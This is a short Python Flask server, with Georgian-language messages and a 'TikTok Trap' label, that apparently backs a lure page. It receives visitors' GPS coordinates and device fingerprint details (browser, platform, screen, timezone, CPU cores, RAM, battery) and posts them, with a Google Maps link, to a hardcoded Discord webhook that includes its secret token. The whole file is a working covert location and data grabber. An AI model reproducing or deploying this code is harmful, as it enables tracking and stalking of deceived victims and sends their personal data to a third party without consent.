from flask import Flask, request, render_template
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1570497608663965843/5ikHZy4Dhpeq3tEwLgr8_OA6uioiLtxNixed3peUnOv-32HFyNrEJ1Mw0yxQw3A0RH-M"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/upload_data', methods=['POST'])
def upload_data():
    try:
        data = request.json
        
        if data['lat'] != "უარი":
            maps_link = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
            location_text = f"📍 **ლოკაცია:** [დააჭირე რუკის საჩვენებლად]({maps_link})"
        else:
            location_text = "📍 **ლოკაცია:** მომხმარებელმა უარი თქვა"

        content = f"""
🎯 **ახალი მონაცემები (TikTok Trap)!**
{location_text}

💻 **მოწყობილობის ინფორმაცია:**
• **ბრაუზერი:** `{data['userAgent']}`
• **პლატფორმა:** `{data['platform']}`
• **ენა:** `{data['language']}`
• **ეკრანი:** `{data['screen']}` (ფერების სიღრმე: `{data['colorDepth']}`)
• **დროის სარტყელი:** `{data['timezone']}`
• **პროცესორის ბირთვები:** `{data['cores']}`
• **RAM:** `{data['ram']}`
• **ბატარეა:** `{data['battery']}`
        """
        
        payload = {"content": content}
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        
        if response.status_code == 204:
            print("✅ მონაცემები წარმატებით გაიგზავნა!")
            return "წარმატება"
        else:
            print(f"❌ Discord-ის შეცდომა: {response.status_code}")
            return "შეცდომა"
    except Exception as e:
        print(f"❌ შეცდომა: {e}")
        return "შეცდომა"

# 🚨 ეს უნდა იყოს ბოლოში
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
